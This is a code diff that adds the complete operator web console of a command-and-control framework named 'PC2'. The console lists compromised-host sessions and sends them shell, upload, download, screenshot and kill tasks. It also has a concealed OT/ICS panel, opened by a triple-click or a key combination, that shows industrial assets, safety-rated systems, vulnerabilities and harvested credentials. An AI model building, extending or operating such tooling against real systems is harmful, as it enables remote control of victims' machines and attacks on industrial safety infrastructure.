@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PC2 — Command Portal</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0e17;--bg2:#111827;--bg3:#1e2738;--bg4:#2a3447;
+  --fg:#e2e8f0;--fg2:#94a3b8;--fg3:#64748b;
+  --accent:#3b82f6;--accent2:#2563eb;--accent-glow:rgba(59,130,246,.15);
+  --green:#22c55e;--yellow:#eab308;--red:#ef4444;--orange:#f97316;--purple:#a855f7;
+  --border:#1e293b;--radius:8px;
+  font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
+  font-size:14px;color:var(--fg);background:var(--bg);
+}
+body{height:100vh;overflow:hidden}
+
+/* ── LOGIN ── */
+#login-screen{display:flex;align-items:center;justify-content:center;height:100vh;background:radial-gradient(ellipse at 50% 0%,#131b2e 0%,var(--bg) 70%)}
+.login-box{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:40px;width:360px;box-shadow:0 25px 60px rgba(0,0,0,.5)}
+.login-box h1{font-size:24px;font-weight:700;margin-bottom:4px;letter-spacing:-.5px}
+.login-box .sub{color:var(--fg3);font-size:12px;margin-bottom:28px}
+.login-box label{display:block;font-size:12px;color:var(--fg2);margin-bottom:4px;font-weight:500}
+.login-box input{width:100%;padding:10px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);color:var(--fg);font-size:14px;margin-bottom:16px;outline:none;transition:border .2s}
+.login-box input:focus{border-color:var(--accent)}
+.login-box button{width:100%;padding:10px;background:var(--accent);border:none;border-radius:var(--radius);color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:background .2s}
+.login-box button:hover{background:var(--accent2)}
+.login-err{color:var(--red);font-size:12px;margin-bottom:12px;display:none}
+
+/* ── MAIN LAYOUT ── */
+#app{display:none;height:100vh;flex-direction:column}
+header{display:flex;align-items:center;justify-content:space-between;padding:0 20px;height:48px;background:var(--bg2);border-bottom:1px solid var(--border);flex-shrink:0}
+header .brand{font-weight:700;font-size:16px;letter-spacing:-.5px;display:flex;align-items:center;gap:8px}
+header .brand span{color:var(--accent)}
+header .right{display:flex;align-items:center;gap:12px}
+header .user-badge{font-size:12px;color:var(--fg2);background:var(--bg3);padding:4px 10px;border-radius:20px}
+header button{background:transparent;border:1px solid var(--border);color:var(--fg2);padding:4px 12px;border-radius:var(--radius);cursor:pointer;font-size:12px}
+header button:hover{border-color:var(--fg3);color:var(--fg)}
+
+.tabs{display:flex;background:var(--bg2);border-bottom:1px solid var(--border);padding:0 20px;gap:0;flex-shrink:0}
+.tab{padding:10px 20px;font-size:13px;color:var(--fg3);cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;font-weight:500}
+.tab:hover{color:var(--fg2)}
+.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+
+.main{flex:1;overflow:hidden;display:flex}
+
+/* ── PANELS ── */
+.panel{display:none;flex:1;overflow:hidden}
+.panel.active{display:flex}
+
+/* ── DASHBOARD ── */
+#panel-dashboard{flex-direction:column;padding:20px;gap:16px;overflow-y:auto}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.stat{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px}
+.stat .label{font-size:11px;color:var(--fg3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px}
+.stat .value{font-size:28px;font-weight:700}
+.stat .value.green{color:var(--green)}
+.stat .value.yellow{color:var(--yellow)}
+.stat .value.red{color:var(--red)}
+
+/* ── SESSIONS TABLE ── */
+#panel-sessions{flex-direction:column;overflow:hidden}
+.toolbar{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;border-bottom:1px solid var(--border);flex-shrink:0}
+.toolbar input{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);padding:6px 12px;color:var(--fg);width:260px;font-size:13px;outline:none}
+.toolbar input:focus{border-color:var(--accent)}
+.toolbar .actions{display:flex;gap:8px}
+.btn{padding:6px 14px;border-radius:var(--radius);border:1px solid var(--border);background:var(--bg3);color:var(--fg);font-size:12px;cursor:pointer;font-weight:500;transition:all .15s}
+.btn:hover{border-color:var(--fg3)}
+.btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+.btn.primary:hover{background:var(--accent2)}
+.btn.danger{border-color:var(--red);color:var(--red)}
+.btn.danger:hover{background:var(--red);color:#fff}
+
+.table-wrap{flex:1;overflow:auto;padding:0 20px 20px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+thead{position:sticky;top:0;z-index:1}
+th{text-align:left;padding:8px 12px;background:var(--bg2);border-bottom:1px solid var(--border);color:var(--fg3);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+td{padding:8px 12px;border-bottom:1px solid var(--border);white-space:nowrap}
+tr:hover td{background:var(--accent-glow)}
+tr.selected td{background:rgba(59,130,246,.1)}
+.status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
+.status-dot.active{background:var(--green);box-shadow:0 0 6px var(--green)}
+.status-dot.stale{background:var(--yellow);box-shadow:0 0 6px var(--yellow)}
+.status-dot.lost{background:var(--red);box-shadow:0 0 6px var(--red)}
+.os-badge{font-size:11px;padding:2px 8px;border-radius:10px;background:var(--bg4);color:var(--fg2)}
+.mono{font-family:'SF Mono',Consolas,monospace;font-size:12px;color:var(--fg2)}
+
+/* ── INTERACT PANEL ── */
+#panel-interact{flex-direction:column;overflow:hidden}
+.interact-header{padding:12px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:16px;flex-shrink:0}
+.interact-header .meta{display:flex;gap:20px;font-size:12px;color:var(--fg2)}
+.interact-header .meta b{color:var(--fg);font-weight:600}
+.terminal{flex:1;background:#000;font-family:'SF Mono',Consolas,monospace;font-size:13px;padding:16px;overflow-y:auto;line-height:1.6}
+.terminal .prompt{color:var(--accent)}
+.terminal .output{color:var(--green);white-space:pre-wrap;word-break:break-all}
+.terminal .error{color:var(--red);white-space:pre-wrap}
+.terminal .info{color:var(--fg3);font-style:italic}
+.cmd-bar{display:flex;border-top:1px solid var(--border);flex-shrink:0}
+.cmd-bar select{background:var(--bg2);border:none;border-right:1px solid var(--border);color:var(--fg);padding:10px 12px;font-size:13px;outline:none;cursor:pointer}
+.cmd-bar input{flex:1;background:var(--bg2);border:none;color:var(--fg);padding:10px 14px;font-size:13px;font-family:'SF Mono',Consolas,monospace;outline:none}
+.cmd-bar button{background:var(--accent);border:none;color:#fff;padding:10px 20px;font-size:13px;cursor:pointer;font-weight:600}
+
+/* ── OT PANEL (hidden) ── */
+#panel-ot{flex-direction:column;overflow:hidden}
+.ot-banner{background:linear-gradient(135deg,#1a0a2e,#0a1628);padding:20px;border-bottom:1px solid var(--purple);display:flex;align-items:center;gap:12px;flex-shrink:0}
+.ot-banner .shield{font-size:24px}
+.ot-banner h2{color:var(--purple);font-size:16px}
+.ot-banner p{color:var(--fg3);font-size:12px}
+.ot-content{flex:1;overflow-y:auto;padding:20px}
+.ot-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px}
+.ot-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px}
+.ot-card h3{font-size:14px;margin-bottom:8px;color:var(--purple)}
+.ot-card .detail{font-size:12px;color:var(--fg2);margin-bottom:4px}
+.ot-card .detail b{color:var(--fg)}
+.ot-card .severity{display:inline-block;font-size:10px;font-weight:700;padding:2px 6px;border-radius:4px;text-transform:uppercase}
+.sev-critical{background:rgba(239,68,68,.15);color:var(--red)}
+.sev-high{background:rgba(249,115,22,.15);color:var(--orange)}
+.sev-medium{background:rgba(234,179,8,.15);color:var(--yellow)}
+.sev-low{background:rgba(34,197,94,.15);color:var(--green)}
+
+.ot-tabs{display:flex;padding:0 20px;border-bottom:1px solid var(--border);background:var(--bg2);flex-shrink:0}
+.ot-tab{padding:8px 16px;font-size:12px;color:var(--fg3);cursor:pointer;border-bottom:2px solid transparent;font-weight:500}
+.ot-tab:hover{color:var(--fg2)}
+.ot-tab.active{color:var(--purple);border-bottom-color:var(--purple)}
+.ot-sub{display:none}
+.ot-sub.active{display:block}
+.empty-state{text-align:center;padding:60px 20px;color:var(--fg3)}
+.empty-state .big{font-size:40px;margin-bottom:12px}
+
+/* ── RESPONSIVE ── */
+@media(max-width:900px){.stats{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:600px){.stats{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="login-screen">
+  <div class="login-box">
+    <h1>PC2</h1>
+    <div class="sub">Private Command &amp; Control — Operator Portal</div>
+    <div class="login-err" id="login-err"></div>
+    <label>Operator Name</label>
+    <input type="text" id="login-user" placeholder="operator" autocomplete="off" autofocus>
+    <label>Password</label>
+    <input type="password" id="login-pass" placeholder="password">
+    <button onclick="doLogin()">Sign In</button>
+  </div>
+</div>
+
+<!-- APP -->
+<div id="app">
+  <header>
+    <div class="brand"><span>PC2</span> Command Portal</div>
+    <div class="right">
+      <span class="user-badge" id="user-badge"></span>
+      <button onclick="doLogout()">Logout</button>
+    </div>
+  </header>
+  <div class="tabs" id="main-tabs">
+    <div class="tab active" data-panel="dashboard">Dashboard</div>
+    <div class="tab" data-panel="sessions">Sessions</div>
+    <div class="tab" data-panel="interact">Interact</div>
+  </div>
+  <div class="main">
+
+    <!-- DASHBOARD -->
+    <div class="panel active" id="panel-dashboard">
+      <div class="stats">
+        <div class="stat"><div class="label">Active Sessions</div><div class="value green" id="s-active">0</div></div>
+        <div class="stat"><div class="label">Stale</div><div class="value yellow" id="s-stale">0</div></div>
+        <div class="stat"><div class="label">Total Seen</div><div class="value" id="s-total">0</div></div>
+        <div class="stat"><div class="label">Pending Tasks</div><div class="value" id="s-tasks">—</div></div>
+      </div>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px;flex:1;overflow-y:auto">
+        <h3 style="font-size:14px;margin-bottom:12px;color:var(--fg2)">Recent Sessions</h3>
+        <table>
+          <thead><tr><th>Status</th><th>Hostname</th><th>User</th><th>OS</th><th>IP</th><th>Last Checkin</th></tr></thead>
+          <tbody id="dash-table"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- SESSIONS -->
+    <div class="panel" id="panel-sessions">
+      <div class="toolbar">
+        <input type="text" id="search-input" placeholder="Search sessions..." oninput="renderSessions()">
+        <div class="actions">
+          <button class="btn" onclick="refreshSessions()">Refresh</button>
+          <button class="btn primary" onclick="interactSelected()">Interact</button>
+        </div>
+      </div>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th></th><th>Status</th><th>ID</th><th>Hostname</th><th>User</th><th>OS / Arch</th><th>PID</th><th>Process</th><th>Transport</th><th>Remote IP</th><th>Last Checkin</th></tr></thead>
+          <tbody id="sess-table"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- INTERACT -->
+    <div class="panel" id="panel-interact">
+      <div class="interact-header">
+        <span style="font-weight:700;font-size:14px" id="int-title">No session selected</span>
+        <div class="meta" id="int-meta"></div>
+      </div>
+      <div class="terminal" id="terminal">
+        <div class="info">Select a session and use the command bar below to interact.</div>
+      </div>
+      <div class="cmd-bar">
+        <select id="cmd-type">
+          <option value="shell">shell</option>
+          <option value="upload">upload</option>
+          <option value="download">download</option>
+          <option value="ls">ls</option>
+          <option value="ps">ps</option>
+          <option value="ifconfig">ifconfig</option>
+          <option value="screenshot">screenshot</option>
+          <option value="kill">kill</option>
+        </select>
+        <input type="text" id="cmd-args" placeholder="command arguments..." onkeydown="if(event.key==='Enter')sendTask()">
+        <button onclick="sendTask()">Execute</button>
+      </div>
+    </div>
+
+    <!-- OT INTERFACE -->
+    <div class="panel" id="panel-ot">
+      <div class="ot-banner">
+        <div class="shield">&#9762;</div>
+        <div>
+          <h2>OT / ICS Assessment Interface</h2>
+          <p>Read-only operational technology reconnaissance &amp; analysis</p>
+        </div>
+      </div>
+      <div class="ot-tabs">
+        <div class="ot-tab active" data-ot="assets">Assets</div>
+        <div class="ot-tab" data-ot="vulns">Vulnerabilities</div>
+        <div class="ot-tab" data-ot="creds">Credentials</div>
+        <div class="ot-tab" data-ot="topology">Topology</div>
+        <div class="ot-tab" data-ot="compliance">Compliance</div>
+      </div>
+      <div class="ot-content">
+        <div class="ot-sub active" id="ot-assets"><div class="ot-grid" id="ot-assets-grid"></div><div class="empty-state" id="ot-assets-empty"><div class="big">&#9881;</div>No OT assets discovered yet.<br>Run OT reconnaissance tasks from an active session.</div></div>
+        <div class="ot-sub" id="ot-vulns"><div class="ot-grid" id="ot-vulns-grid"></div><div class="empty-state" id="ot-vulns-empty"><div class="big">&#128737;</div>No vulnerability findings.</div></div>
+        <div class="ot-sub" id="ot-creds"><div class="ot-grid" id="ot-creds-grid"></div><div class="empty-state" id="ot-creds-empty"><div class="big">&#128273;</div>No credential findings.</div></div>
+        <div class="ot-sub" id="ot-topology"><div class="empty-state" id="ot-topo-empty"><div class="big">&#128268;</div>No topology data.</div><div id="ot-topo-grid" class="ot-grid"></div></div>
+        <div class="ot-sub" id="ot-compliance"><div class="ot-grid" id="ot-compliance-grid"></div><div class="empty-state" id="ot-compliance-empty"><div class="big">&#128203;</div>No compliance findings.</div></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const API = window.location.origin;
+let token = '';
+let sessions = [];
+let selectedSession = null;
+let otVisible = false;
+
+// ── AUTH ──
+function doLogin() {
+  const user = document.getElementById('login-user').value.trim();
+  const pass = document.getElementById('login-pass').value;
+  if (!user || !pass) { showLoginErr('Enter operator name and password'); return; }
+  fetch(API + '/api/auth/login', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({username: user, password: pass})
+  }).then(r => r.json()).then(d => {
+    if (d.error) { showLoginErr(d.error); return; }
+    token = d.token;
+    sessionStorage.setItem('pc2_token', token);
+    sessionStorage.setItem('pc2_user', user);
+    enterApp(user);
+  }).catch(() => showLoginErr('Connection failed'));
+}
+
+function showLoginErr(msg) {
+  const el = document.getElementById('login-err');
+  el.textContent = msg; el.style.display = 'block';
+}
+
+function enterApp(user) {
+  document.getElementById('login-screen').style.display = 'none';
+  document.getElementById('app').style.display = 'flex';
+  document.getElementById('user-badge').textContent = user;
+  refreshSessions();
+  setInterval(refreshSessions, 5000);
+}
+
+function doLogout() {
+  sessionStorage.clear();
+  token = '';
+  location.reload();
+}
+
+// auto-login from session
+(function() {
+  const t = sessionStorage.getItem('pc2_token');
+  const u = sessionStorage.getItem('pc2_user');
+  if (t && u) { token = t; enterApp(u); }
+})();
+
+// ── TABS ──
+document.getElementById('main-tabs').addEventListener('click', e => {
+  const tab = e.target.closest('.tab');
+  if (!tab) return;
+  document.querySelectorAll('#main-tabs .tab').forEach(t => t.classList.remove('active'));
+  tab.classList.add('active');
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('panel-' + tab.dataset.panel).classList.add('active');
+});
+
+document.querySelector('.ot-tabs').addEventListener('click', e => {
+  const tab = e.target.closest('.ot-tab');
+  if (!tab) return;
+  document.querySelectorAll('.ot-tab').forEach(t => t.classList.remove('active'));
+  tab.classList.add('active');
+  document.querySelectorAll('.ot-sub').forEach(p => p.classList.remove('active'));
+  document.getElementById('ot-' + tab.dataset.ot).classList.add('active');
+});
+
+// ── HIDDEN OT TAB TRIGGER ──
+// Triple-click the brand text to reveal OT tab
+let brandClicks = 0, brandTimer;
+document.querySelector('header .brand').addEventListener('click', () => {
+  brandClicks++;
+  clearTimeout(brandTimer);
+  brandTimer = setTimeout(() => brandClicks = 0, 600);
+  if (brandClicks >= 3) {
+    brandClicks = 0;
+    toggleOT();
+  }
+});
+
+// Also Ctrl+Shift+O
+document.addEventListener('keydown', e => {
+  if (e.ctrlKey && e.shiftKey && e.key === 'O') {
+    e.preventDefault();
+    toggleOT();
+  }
+});
+
+function toggleOT() {
+  otVisible = !otVisible;
+  let otTab = document.getElementById('ot-tab-btn');
+  if (otVisible) {
+    if (!otTab) {
+      otTab = document.createElement('div');
+      otTab.className = 'tab';
+      otTab.id = 'ot-tab-btn';
+      otTab.dataset.panel = 'ot';
+      otTab.textContent = 'OT/ICS';
+      otTab.style.color = 'var(--purple)';
+      document.getElementById('main-tabs').appendChild(otTab);
+    } else {
+      otTab.style.display = '';
+    }
+    loadOTData();
+  } else if (otTab) {
+    otTab.style.display = 'none';
+    // if we're on OT panel, switch away
+    if (document.getElementById('panel-ot').classList.contains('active')) {
+      document.querySelector('[data-panel="dashboard"]').click();
+    }
+  }
+}
+
+// ── API HELPERS ──
+function apiFetch(path, opts = {}) {
+  opts.headers = opts.headers || {};
+  opts.headers['Authorization'] = 'Bearer ' + token;
+  if (opts.body && typeof opts.body === 'object') {
+    opts.headers['Content-Type'] = 'application/json';
+    opts.body = JSON.stringify(opts.body);
+  }
+  return fetch(API + path, opts).then(r => r.json());
+}
+
+// ── SESSIONS ──
+function refreshSessions() {
+  apiFetch('/api/sessions').then(data => {
+    if (Array.isArray(data)) {
+      sessions = data;
+      renderSessions();
+      renderDashboard();
+    }
+  }).catch(() => {});
+}
+
+function renderDashboard() {
+  const now = Date.now();
+  let active = 0, stale = 0;
+  sessions.forEach(s => {
+    const age = now - new Date(s.last_checkin).getTime();
+    if (age < 30000) active++; else stale++;
+  });
+  document.getElementById('s-active').textContent = active;
+  document.getElementById('s-stale').textContent = stale;
+  document.getElementById('s-total').textContent = sessions.length;
+
+  const tb = document.getElementById('dash-table');
+  tb.innerHTML = sessions.slice(0, 10).map(s => {
+    const age = now - new Date(s.last_checkin).getTime();
+    const cls = age < 30000 ? 'active' : age < 120000 ? 'stale' : 'lost';
+    return `<tr>
+      <td><span class="status-dot ${cls}"></span>${cls}</td>
+      <td><b>${esc(s.hostname)}</b></td>
+      <td>${esc(s.username)}</td>
+      <td><span class="os-badge">${esc(s.os)} ${esc(s.arch)}</span></td>
+      <td class="mono">${esc(s.remote_addr)}</td>
+      <td class="mono">${timeAgo(s.last_checkin)}</td>
+    </tr>`;
+  }).join('');
+}
+
+function renderSessions() {
+  const q = (document.getElementById('search-input').value || '').toLowerCase();
+  const now = Date.now();
+  const filtered = sessions.filter(s =>
+    !q || s.hostname.toLowerCase().includes(q) || s.username.toLowerCase().includes(q) ||
+    s.os.toLowerCase().includes(q) || s.remote_addr.includes(q) || s.id.includes(q)
+  );
+
+  const tb = document.getElementById('sess-table');
+  tb.innerHTML = filtered.map(s => {
+    const age = now - new Date(s.last_checkin).getTime();
+    const cls = age < 30000 ? 'active' : age < 120000 ? 'stale' : 'lost';
+    const sel = selectedSession === s.id ? 'selected' : '';
+    return `<tr class="${sel}" onclick="selectSession('${s.id}')" ondblclick="interactWith('${s.id}')">
+      <td><input type="radio" name="sess" ${selectedSession===s.id?'checked':''} onclick="selectSession('${s.id}')"></td>
+      <td><span class="status-dot ${cls}"></span>${cls}</td>
+      <td class="mono" style="max-width:140px;overflow:hidden;text-overflow:ellipsis">${esc(s.id.substring(0,8))}…</td>
+      <td><b>${esc(s.hostname)}</b></td>
+      <td>${esc(s.username)}</td>
+      <td><span class="os-badge">${esc(s.os)} ${esc(s.arch)}</span></td>
+      <td class="mono">${s.pid}</td>
+      <td>${esc(s.process||'—')}</td>
+      <td>${esc(s.transport)}</td>
+      <td class="mono">${esc(s.remote_addr)}</td>
+      <td class="mono">${timeAgo(s.last_checkin)}</td>
+    </tr>`;
+  }).join('');
+}
+
+function selectSession(id) { selectedSession = id; renderSessions(); }
+
+function interactSelected() {
+  if (!selectedSession) return alert('Select a session first');
+  interactWith(selectedSession);
+}
+
+function interactWith(id) {
+  selectedSession = id;
+  const s = sessions.find(x => x.id === id);
+  if (!s) return;
+  document.getElementById('int-title').textContent = s.hostname + ' — ' + s.id.substring(0, 8);
+  document.getElementById('int-meta').innerHTML =
+    `<span><b>User:</b> ${esc(s.username)}</span>
+     <span><b>OS:</b> ${esc(s.os)} ${esc(s.arch)}</span>
+     <span><b>PID:</b> ${s.pid}</span>
+     <span><b>IP:</b> ${esc(s.remote_addr)}</span>`;
+  document.querySelector('[data-panel="interact"]').click();
+  document.getElementById('cmd-args').focus();
+}
+
+// ── TASK EXECUTION ──
+function sendTask() {
+  if (!selectedSession) { appendTerm('error', 'No session selected.'); return; }
+  const type = document.getElementById('cmd-type').value;
+  const args = document.getElementById('cmd-args').value;
+  document.getElementById('cmd-args').value = '';
+
+  appendTerm('prompt', `[${type}] ${args}`);
+
+  apiFetch(`/api/sessions/${selectedSession}/task`, {
+    method: 'POST',
+    body: { type, args }
+  }).then(d => {
+    if (d.error) { appendTerm('error', d.error); return; }
+    appendTerm('info', `Task ${d.task_id.substring(0,8)} queued, waiting for result...`);
+    pollResult(d.task_id);
+  }).catch(e => appendTerm('error', 'Request failed: ' + e.message));
+}
+
+function pollResult(taskId, attempts = 0) {
+  if (attempts > 60) { appendTerm('error', `Task ${taskId.substring(0,8)} timed out.`); return; }
+  setTimeout(() => {
+    apiFetch(`/api/tasks/${taskId}`).then(d => {
+      if (d.status === 'pending') { pollResult(taskId, attempts + 1); return; }
+      if (d.success) {
+        appendTerm('output', d.output || '(no output)');
+      } else {
+        appendTerm('error', d.error || 'Task failed');
+      }
+    }).catch(() => pollResult(taskId, attempts + 1));
+  }, 2000);
+}
+
+function appendTerm(cls, text) {
+  const term = document.getElementById('terminal');
+  const div = document.createElement('div');
+  div.className = cls;
+  if (cls === 'prompt') {
+    div.innerHTML = '<span class="prompt">PC2 &gt; </span>' + esc(text);
+  } else {
+    div.textContent = text;
+  }
+  term.appendChild(div);
+  term.scrollTop = term.scrollHeight;
+}
+
+// ── OT DATA ──
+function loadOTData() {
+  apiFetch('/api/ot/assets').then(d => {
+    const grid = document.getElementById('ot-assets-grid');
+    const empty = document.getElementById('ot-assets-empty');
+    if (!Array.isArray(d) || d.length === 0) { grid.innerHTML = ''; empty.style.display = ''; return; }
+    empty.style.display = 'none';
+    grid.innerHTML = d.map(a => `<div class="ot-card">
+      <h3>${esc(a.hostname || a.ip)}</h3>
+      <div class="detail"><b>Role:</b> ${esc(a.role||'Unknown')}</div>
+      <div class="detail"><b>Vendor:</b> ${esc(a.vendor||'—')} ${esc(a.model||'')}</div>
+      <div class="detail"><b>Protocol:</b> ${esc(a.protocol||'—')}</div>
+      <div class="detail"><b>Purdue Level:</b> ${a.purdue_level}</div>
+      <div class="detail"><b>IP:</b> <span class="mono">${esc(a.ip)}</span></div>
+      ${a.safety_rated ? '<div class="detail" style="color:var(--red)"><b>Safety Rated — SIL '+a.sil_level+'</b></div>' : ''}
+    </div>`).join('');
+  }).catch(() => {});
+
+  apiFetch('/api/ot/vulns').then(d => {
+    const grid = document.getElementById('ot-vulns-grid');
+    const empty = document.getElementById('ot-vulns-empty');
+    if (!Array.isArray(d) || d.length === 0) { grid.innerHTML = ''; empty.style.display = ''; return; }
+    empty.style.display = 'none';
+    grid.innerHTML = d.map(v => `<div class="ot-card">
+      <h3>${esc(v.cve_id || 'Finding')}</h3>
+      <div class="detail">${esc(v.description)}</div>
+      <div class="detail"><b>Target:</b> ${esc(v.target)}</div>
+      <div class="detail"><b>CVSS:</b> ${v.cvss}</div>
+      <span class="severity sev-${(v.severity||'medium').toLowerCase()}">${esc(v.severity)}</span>
+    </div>`).join('');
+  }).catch(() => {});
+
+  apiFetch('/api/ot/credentials').then(d => {
+    const grid = document.getElementById('ot-creds-grid');
+    const empty = document.getElementById('ot-creds-empty');
+    if (!Array.isArray(d) || d.length === 0) { grid.innerHTML = ''; empty.style.display = ''; return; }
+    empty.style.display = 'none';
+    grid.innerHTML = d.map(c => `<div class="ot-card">
+      <h3>${esc(c.target)}:${c.port}</h3>
+      <div class="detail"><b>Service:</b> ${esc(c.service)}</div>
+      <div class="detail"><b>Username:</b> ${esc(c.username)}</div>
+      <div class="detail"><b>Default Cred:</b> ${c.is_default ? 'Yes' : 'No'}</div>
+      <span class="severity sev-${(c.severity||'medium').toLowerCase()}">${esc(c.severity)}</span>
+    </div>`).join('');
+  }).catch(() => {});
+
+  apiFetch('/api/ot/compliance').then(d => {
+    const grid = document.getElementById('ot-compliance-grid');
+    const empty = document.getElementById('ot-compliance-empty');
+    if (!Array.isArray(d) || d.length === 0) { grid.innerHTML = ''; empty.style.display = ''; return; }
+    empty.style.display = 'none';
+    grid.innerHTML = d.map(c => `<div class="ot-card">
+      <h3>${esc(c.framework)} — ${esc(c.section)}</h3>
+      <div class="detail">${esc(c.description)}</div>
+      <div class="detail"><b>Requirement:</b> ${esc(c.requirement)}</div>
+      <div class="detail"><b>Status:</b> ${esc(c.status)}</div>
+      <span class="severity sev-${(c.severity||'medium').toLowerCase()}">${esc(c.severity)}</span>
+    </div>`).join('');
+  }).catch(() => {});
+}
+
+// ── UTILS ──
+function esc(s) {
+  if (!s) return '';
+  const d = document.createElement('div');
+  d.textContent = String(s);
+  return d.innerHTML;
+}
+
+function timeAgo(ts) {
+  const s = Math.floor((Date.now() - new Date(ts).getTime()) / 1000);
+  if (s < 5) return 'just now';
+  if (s < 60) return s + 's ago';
+  if (s < 3600) return Math.floor(s/60) + 'm ago';
+  return Math.floor(s/3600) + 'h ago';
+}
+
+// keyboard shortcut hint
+document.getElementById('login-pass').addEventListener('keydown', e => {
+  if (e.key === 'Enter') doLogin();
+});
+</script>
+</body>
+</html>
